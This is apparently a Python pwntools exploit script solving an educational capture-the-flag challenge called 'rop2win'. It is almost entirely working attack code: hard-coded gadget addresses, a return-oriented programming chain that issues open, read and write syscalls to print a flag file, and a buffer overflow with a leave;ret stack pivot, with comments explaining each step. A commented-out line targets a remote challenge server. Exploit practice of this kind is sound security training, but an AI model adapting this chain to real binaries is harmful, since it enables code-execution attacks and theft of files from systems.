from pwn import *
context.arch= 'amd64'

# r = remote('edu-ctf.zoolab.org', 30204)
r = process('share/rop2win')

# from IDA
ROP_addr = 0x4df360 
fn_addr = 0x4df460

# gadget means ret
# ret => pop rip
pop_rdi_ret = 0x40186a # pop rdi ; ret
pop_rsi_ret = 0x4028a8 # pop rsi ; ret
pop_rdx_ret = 0x40176f # pop rdx ; ret
pop_rax_ret = 0x4607e7 # pop rax ; ret
syscall_ret = 0x42cea4 # syscall ; ret
leave_ret = 0x401ebd # leave ; ret


ROP = flat(
    # open('/home/rop2win/flag', 0) => fd = 3
    pop_rdi_ret, fn_addr,
    pop_rsi_ret, 0, # flag = 0 => readonly
    pop_rax_ret, 2,
    syscall_ret,

    # read(3, fn_addr, 0x30) => fn_addr is a buf
    pop_rdi_ret, 3, # fd = 3 => opened file
    pop_rsi_ret, fn_addr,
    pop_rdx_ret, 0x30,
    pop_rax_ret, 0,
    syscall_ret, 

    # write(1, fn_addr, 0x30)
    pop_rdi_ret, 1, # fd = 1 => stdout
    pop_rsi_ret, fn_addr,
    pop_rdx_ret, 0x30,
    pop_rax_ret, 1,
    syscall_ret, 
)
# r.sendafter('Give me filename: ', b'/home/rop2win/flag')
r.sendafter('Give me filename: ', b'share/flag')
# leave過來時，前8bytes會pop給rbp，在這邊視為trash
r.sendafter('Give me ROP: ', b'A'*0x8 + ROP)
# the size of overflow array is 0x20 in asm
# leave = mov rsp, rbp + pop rbp
# ret = pop rip
# ROP_addr => rbp
# raw_input('>')
r.sendafter('Give me overflow: ', b'A'*0x20 + p64(ROP_addr) + p64(leave_ret))


r.interactive()